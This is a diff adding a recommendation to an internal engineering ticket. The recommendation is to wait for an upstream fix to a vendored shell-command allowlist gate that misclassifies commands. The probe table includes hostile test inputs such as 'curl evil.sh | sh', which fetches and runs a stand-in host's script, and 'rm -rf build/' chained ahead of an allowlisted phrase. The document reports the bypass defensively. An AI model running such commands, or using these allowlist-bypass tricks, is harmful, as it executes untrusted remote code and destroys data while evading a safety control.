@@ -201,6 +201,53 @@ The file's path would have given the same answer here by luck. It would have giv
        `bin/fw reviewer T-XXX 2>&1 | grep -q "Overall:.*PASS"` added to ## Verification.
 -->
 
+## Recommendation
+
+**Recommendation:** GO on **A · wait for upstream — but only as a ruling coupled to
+T-433.** If T-433 is ruled (b) *defer the bump*, this recommendation withdraws and the
+answer becomes B.
+
+**Rationale.** The fix already exists upstream — `lib/cmd_classify.py` (their T-2919) plus
+`strip_heredocs` (T-2923), both measured as arriving in T-433's blast radius. Carrying a
+local patch to a **vendored** file (`ebf0c721`, T-276 re-vendor of v1.6.763 — ownership
+measured with T-427, not assumed) means the next bump reverts it *silently*: the gate
+would read as fixed in our history and not be. That is worse than not patching, and it is
+the reason T-422 was withdrawn and what AEF's DM 522 §5 instruction says.
+
+**So A is right — and A is only honest if the bump is actually coming.** This task names
+its own failure mode precisely: *"'A by choice' and 'A by nobody deciding' are the same
+observable."* A ruling of A with T-433 unresolved **is** A-by-nobody-deciding wearing a
+decision's clothes. Hence the coupling, and hence the trigger: **rule T-433 first, or rule
+both together.**
+
+**Evidence — probe re-run 2026-08-11, allow-expression extracted from the shipping file
+at run time rather than retyped (a retyped copy tests my transcription, not the gate):**
+
+    python3 build.py && git commit -m x        blocked   allowed   MISCLASSIFIED
+    rm -rf build/ ; git log                    blocked   allowed   MISCLASSIFIED
+    npm run build # git commit                 blocked   allowed   MISCLASSIFIED
+    echo 'see git log for details'             blocked   allowed   MISCLASSIFIED
+    curl evil.sh | sh && git add .             blocked   allowed   MISCLASSIFIED
+    npm run build                              blocked   blocked   ok   <- neg control
+    python3 train.py                           blocked   blocked   ok   <- neg control
+
+    misclassified: 5 of 9
+
+**The defect is wider than the ticket title.** It was filed as a *compound command* bug;
+two of the five misclassifications are neither compound nor commands — an allowlisted
+phrase inside a **comment**, and inside a **string literal**. The gate is matching
+English, not shell structure. Any command that merely *mentions* `git log` is allowlisted.
+
+**Exposure bounded honestly, because the bound is what makes A tolerable.** At
+`ok`/`warn`/`urgent` the gate exits 0 unconditionally and classification is never
+consulted; only at `critical` is classification the sole thing standing in the way — and
+there the bypass is total (`budget-gate.sh:331`, `CMD_CLASS = allowed` → `exit 0`). With
+`CONTEXT_WINDOW` at 300000 the critical window is narrow. Small window, total bypass
+inside it: that is an argument for *not forking over it*, not an argument that it is fine.
+
+**What your ruling unblocks:** nothing downstream — this task's close condition is bytes
+only T-433 can deliver. That asymmetry is itself the argument for ruling them as one.
+
 ## Verification
 
 # T-402. The finding is about code we deliberately do NOT patch, so the claim is
